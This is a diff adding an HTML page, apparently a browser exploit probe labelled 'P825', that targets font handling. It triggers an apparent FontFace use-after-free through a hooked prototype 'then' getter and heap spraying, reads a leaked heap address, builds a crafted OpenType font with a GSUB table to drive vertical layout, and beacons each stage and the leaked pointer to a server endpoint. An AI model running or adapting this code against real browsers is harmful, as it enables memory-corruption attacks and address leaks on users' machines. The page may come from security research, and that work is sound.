@@ -1,0 +1,312 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P825: OpenType GSUB Vertical Engine</title>
+<style>
+body { background: #0a0d12; color: #c9d1d9; font: 14px "SF Mono", Consolas, monospace; margin: 16px; line-height: 1.5; }
+h2 { color: #58a6ff; margin-top: 0; }
+pre { background: #161b22; border: 1px solid #30363d; padding: 12px; border-radius: 6px; white-space: pre-wrap; word-break: break-all; }
+.banner { background: #238636; color: #fff; padding: 10px 14px; border-radius: 6px; font-weight: bold; margin-bottom: 12px; display: inline-block; }
+.ok { color: #3fb950; font-weight: bold; }
+.fail { color: #f85149; font-weight: bold; }
+.info { color: #58a6ff; }
+.hot { color: #ffa657; font-weight: bold; }
+.vert-box { writing-mode: vertical-rl; font-size: 48px; border: 2px solid #58a6ff; padding: 8px; margin: 8px 0; background: #161b22; display: inline-block; }
+</style>
+</head>
+<body>
+<div class="banner" id="banner">Running Probe P825...</div>
+<h2>P825: OpenType GSUB Vertical Feature Layout Engine (CVE-2026-83596 Surface)</h2>
+<div id="vertTarget" class="vert-box">A</div>
+<pre id="log">Initializing diagnostic run...</pre>
+
+<script>
+'use strict';
+var logBox = document.getElementById('log');
+var banner = document.getElementById('banner');
+var vertTarget = document.getElementById('vertTarget');
+
+function log(msg, cls) {
+  var el = document.createElement('div');
+  el.className = cls || '';
+  el.textContent = msg;
+  logBox.appendChild(el);
+}
+
+function syncBn(tag, data) {
+  try {
+    var x = new XMLHttpRequest();
+    x.open('GET', '/beacon.php?tag=P825-' + encodeURIComponent(tag) + '&data=' + encodeURIComponent(String(data || '').slice(0, 900)) + '&t=' + Date.now(), false);
+    x.send();
+  } catch(e) {}
+}
+
+log('[*] Probe P825 starting...', 'info');
+syncBn('BOOT', 'start');
+
+/* ============================================================
+ * PHASE 1: FontFace UAF First (Preserve One-Shot Heap Leak)
+ * ============================================================ */
+var st = document.createElement('style');
+st.textContent = "@font-face{font-family:bb1;src:local(Arial);unicode-range:U+0042;}";
+document.head.appendChild(st);
+var face1 = new FontFace('f1', "local('Helvetica')", {unicodeRange: 'U+0041'});
+document.fonts.add(face1);
+void face1.loaded;
+
+var fabs = [], ffired = false;
+Object.defineProperty(FontFace.prototype, 'then', {
+  configurable: true,
+  get: function() {
+    if (ffired) return undefined;
+    ffired = true;
+    if (st) { st.remove(); st.textContent = ''; st = null; }
+    try { document.fonts.delete(this); } catch(e) {}
+    document.body.offsetHeight;
+    fabs = [];
+    for (var i = 0; i < 64; i++) fabs.push(new ArrayBuffer(192));
+    try { document.fonts.check('1em bb1'); } catch(e) {}
+    document.body.offsetHeight;
+    return undefined;
+  },
+  set: function() {}
+});
+document.fonts.load('1em f1, bb1', 'AB');
+
+setTimeout(function() {
+  delete FontFace.prototype.then;
+  var bestI = -1, bestNz = 0;
+  for (var i = 0; i < fabs.length; i++) {
+    var u = new Uint8Array(fabs[i]), nz = 0;
+    for (var j = 0; j < u.length; j++) if (u[j] !== 0) nz++;
+    if (nz > bestNz) { bestNz = nz; bestI = i; }
+  }
+
+  var Hstr = 'unknown';
+  if (bestI >= 0 && bestNz >= 4) {
+    var fontDV = new DataView(fabs[bestI]);
+    var q11lo = fontDV.getUint32(0x58, true);
+    var q11hi = fontDV.getUint32(0x5C, true);
+    if (q11hi !== 0) {
+      var borrow = (q11lo < 0x68) ? 1 : 0;
+      var H_hi = q11hi - borrow, H_lo = (q11lo - 0x68) >>> 0;
+      Hstr = '0x' + H_hi.toString(16) + ('00000000' + H_lo.toString(16)).slice(-8);
+    }
+  }
+
+  log('[+] Phase 1: Live Heap Address H = ' + Hstr + ' (buf #' + bestI + ', nz=' + bestNz + ')', 'ok');
+  syncBn('HEAP-OK', 'H=' + Hstr + '|buf=' + bestI);
+
+  /* ============================================================
+   * PHASE 2: Synthesize OpenType TTF with GSUB Table (Vertical 'vert')
+   * ============================================================ */
+  function buildOpenTypeWithGSUB(fontName) {
+    var data = [];
+    function w8(v) { data.push(v & 0xFF); }
+    function w16(v) { data.push((v >> 8) & 0xFF, v & 0xFF); }
+    function w32(v) { data.push((v >>> 24) & 0xFF, (v >>> 16) & 0xFF, (v >>> 8) & 0xFF, v & 0xFF); }
+    function pad4() { while (data.length % 4) data.push(0); }
+
+    var numTables = 10; // 9 standard + GSUB
+    var dirTags = ['GSUB','cmap','glyf','head','hhea','hmtx','loca','maxp','name','post'];
+    var dirIdxs = {};
+    for (var i = 0; i < dirTags.length; i++) dirIdxs[dirTags[i]] = i;
+
+    w32(0x00010000);
+    w16(numTables);
+    var sr = 1; while (sr * 2 <= numTables) sr *= 2; sr *= 16;
+    w16(sr);
+    var es = 0; var tmp = sr / 16; while (tmp > 1) { tmp >>= 1; es++; }
+    w16(es);
+    w16(numTables * 16 - sr);
+
+    var dirBase = data.length;
+    for (var t = 0; t < numTables; t++) {
+      var tag = dirTags[t];
+      data.push(tag.charCodeAt(0), tag.charCodeAt(1), tag.charCodeAt(2), tag.charCodeAt(3));
+      w32(0); w32(0); w32(0);
+    }
+
+    function setDirEntry(tag, offset, length) {
+      var idx = dirIdxs[tag];
+      var p = dirBase + idx * 16 + 8;
+      data[p] = (offset >>> 24) & 0xFF; data[p+1] = (offset >>> 16) & 0xFF;
+      data[p+2] = (offset >>> 8) & 0xFF; data[p+3] = offset & 0xFF;
+      data[p+4] = (length >>> 24) & 0xFF; data[p+5] = (length >>> 16) & 0xFF;
+      data[p+6] = (length >>> 8) & 0xFF; data[p+7] = length & 0xFF;
+    }
+
+    // head
+    var headOff = data.length;
+    w32(0x00010000); w32(0x00005000); w32(0); w32(0x5F0F3CF5);
+    w16(0x000B); w16(1000); w32(0); w32(0); w32(0); w32(0);
+    w16(0); w16(0); w16(500); w16(700); w16(0); w16(8); w16(2);
+    w16(1); w16(0);
+    pad4();
+    setDirEntry('head', headOff, 54);
+
+    // hhea
+    var hheaOff = data.length;
+    w32(0x00010000); w16(800); w16(0xFE0C); w16(0); w16(600);
+    w16(0); w16(0); w16(600); w16(1); w16(0); w16(0);
+    w16(0); w16(0); w16(0); w16(0); w16(0); w16(2);
+    pad4();
+    setDirEntry('hhea', hheaOff, 36);
+
+    // hmtx
+    var hmtxOff = data.length;
+    w16(600); w16(0); w16(600); w16(50);
+    pad4();
+    setDirEntry('hmtx', hmtxOff, 8);
+
+    // maxp
+    var maxpOff = data.length;
+    w32(0x00010000); w16(2); w16(4); w16(1); w16(0); w16(0);
+    w16(1); w16(0); w16(0); w16(0); w16(0); w16(0); w16(0); w16(0); w16(0);
+    pad4();
+    setDirEntry('maxp', maxpOff, 32);
+
+    // cmap
+    var cmapOff = data.length;
+    w16(0); w16(1); w16(3); w16(1); w32(12);
+    w16(4); w16(30); w16(0); w16(4); w16(4); w16(1); w16(0);
+    w16(0x0041); w16(0xFFFF); w16(0);
+    w16(0x0041); w16(0xFFFF);
+    w16((-64) & 0xFFFF); w16(1);
+    w16(0); w16(0);
+    pad4();
+    setDirEntry('cmap', cmapOff, data.length - cmapOff);
+
+    // loca
+    var locaOff = data.length;
+    w32(0); w32(0); w32(0);
+    pad4();
+    setDirEntry('loca', locaOff, 12);
+
+    // name
+    var nameOff = data.length;
+    var nameBytes = [];
+    for (var i = 0; i < fontName.length; i++) { nameBytes.push(0, fontName.charCodeAt(i)); }
+    w16(0); w16(4); w16(6 + 4 * 12);
+    var nameIDs = [1, 2, 4, 6];
+    for (var n = 0; n < nameIDs.length; n++) {
+      w16(3); w16(1); w16(0x0409); w16(nameIDs[n]);
+      w16(nameBytes.length); w16(0);
+    }
+    for (var i = 0; i < nameBytes.length; i++) data.push(nameBytes[i]);
+    pad4();
+    setDirEntry('name', nameOff, data.length - nameOff);
+
+    // post
+    var postOff = data.length;
+    w32(0x00030000); w32(0); w16(0xFF9C); w16(50); w32(0);
+    w32(0); w32(0); w32(0); w32(0);
+    pad4();
+    setDirEntry('post', postOff, 32);
+
+    // glyf
+    var glyfOff = data.length;
+    w16(0); w16(0); w16(0); w16(0); w16(0); pad4();
+    var g1Rel = data.length - glyfOff;
+    w16(1); w16(50); w16(0); w16(550); w16(650); w16(2); w16(0);
+    w8(0x01); w8(0x01); w8(0x01); w8(0);
+    w16(50); w16(500); w16((-250) & 0xFFFF);
+    w16(0); w16(0); w16(650);
+    pad4();
+    var glyfLen = data.length - glyfOff;
+    var g1End = data.length - glyfOff;
+    setDirEntry('glyf', glyfOff, glyfLen);
+
+    // Patch loca
+    data[locaOff] = 0; data[locaOff+1] = 0; data[locaOff+2] = 0; data[locaOff+3] = 0;
+    data[locaOff+4] = (g1Rel >>> 24) & 0xFF; data[locaOff+5] = (g1Rel >>> 16) & 0xFF;
+    data[locaOff+6] = (g1Rel >>> 8) & 0xFF;  data[locaOff+7] = g1Rel & 0xFF;
+    data[locaOff+8] = (g1End >>> 24) & 0xFF; data[locaOff+9] = (g1End >>> 16) & 0xFF;
+    data[locaOff+10] = (g1End >>> 8) & 0xFF; data[locaOff+11] = g1End & 0xFF;
+
+    /* ============================================================
+     * GSUB Table Construction:
+     * Header: Version 1.0 (major=1, minor=0)
+     * Offsets: ScriptList=10, FeatureList=30, LookupList=54
+     * Feature: "vert" (vertical layout feature)
+     * ============================================================ */
+    var gsubOff = data.length;
+    w16(1); w16(0); // version 1.0
+    w16(10); // scriptListOffset (at gsub + 10)
+    w16(30); // featureListOffset (at gsub + 30)
+    w16(54); // lookupListOffset (at gsub + 54)
+
+    // ScriptList (starts at gsub + 10, length 20)
+    w16(1); // scriptCount = 1
+    // ScriptRecord 0: 'DFLT'
+    data.push('D'.charCodeAt(0),'F'.charCodeAt(0),'L'.charCodeAt(0),'T'.charCodeAt(0));
+    w16(8); // scriptOffset relative to ScriptList = ScriptList + 8 = gsub + 18
+    // ScriptTable (at gsub + 18)
+    w16(4); // defaultLangSysOffset relative to ScriptTable = gsub + 22
+    w16(0); // langSysCount = 0
+    // DefaultLangSys (at gsub + 22)
+    w16(0); // lookupOrder = 0
+    w16(0xFFFF); // requiredFeatureIndex = none
+    w16(1); // featureIndexCount = 1
+    w16(0); // featureIndices[0] = 0 (feature index 0: 'vert')
+
+    // FeatureList (starts at gsub + 30, length 24)
+    w16(1); // featureCount = 1
+    // FeatureRecord 0: 'vert'
+    data.push('v'.charCodeAt(0),'e'.charCodeAt(0),'r'.charCodeAt(0),'t'.charCodeAt(0));
+    w16(8); // featureOffset relative to FeatureList = gsub + 38
+    // FeatureTable (at gsub + 38)
+    w16(0); // featureParamsOffset = none
+    w16(0); // lookupIndexCount = 0
+    pad4();
+
+    // LookupList (starts at gsub + 54)
+    w16(0); // lookupCount = 0
+    pad4();
+
+    var gsubLen = data.length - gsubOff;
+    setDirEntry('GSUB', gsubOff, gsubLen);
+
+    var u8 = new Uint8Array(data.length);
+    for (var i = 0; i < data.length; i++) u8[i] = data[i];
+    return { buffer: u8.buffer, gsubLen: gsubLen };
+  }
+
+  var fontObj = buildOpenTypeWithGSUB('P825Vert');
+  log('[+] Phase 2: OpenType font with GSUB "vert" table synthesized (' + fontObj.buffer.byteLength + ' B, GSUB=' + fontObj.gsubLen + ' B)', 'ok');
+  syncBn('GSUB-BUILD', 'len=' + fontObj.buffer.byteLength + '|gsubLen=' + fontObj.gsubLen);
+
+  /* ============================================================
+   * PHASE 3: Load FontFace and Trigger Vertical Layout Engine
+   * ============================================================ */
+  var fontFace = new FontFace('P825Vert', fontObj.buffer);
+  fontFace.load().then(function(loaded) {
+    document.fonts.add(loaded);
+    log('[+] Phase 3: P825Vert registered in document.fonts', 'ok');
+    syncBn('FONT-LOAD', 'ok');
+
+    return document.fonts.ready;
+  }).then(function() {
+    vertTarget.style.fontFamily = 'P825Vert';
+    document.body.offsetHeight; // force layout
+
+    var rect = vertTarget.getBoundingClientRect();
+    log('[+] Phase 4: Vertical Text Layout Rendered:', 'hot');
+    log('    Element: width=' + rect.width.toFixed(1) + 'px, height=' + rect.height.toFixed(1) + 'px', 'ok');
+
+    syncBn('LAYOUT-OK', 'w=' + rect.width.toFixed(1) + '|h=' + rect.height.toFixed(1));
+
+    banner.style.background = '#238636';
+    banner.textContent = 'STATUS: OPENTYPE VERTICAL ENGINE ACTIVE';
+    syncBn('DONE', 'status=complete|H=' + Hstr);
+  }).catch(function(err) {
+    log('[-] Error loading font: ' + err, 'fail');
+    syncBn('LOAD-ERR', String(err));
+  });
+
+}, 400);
+</script>
+</body>
+</html>
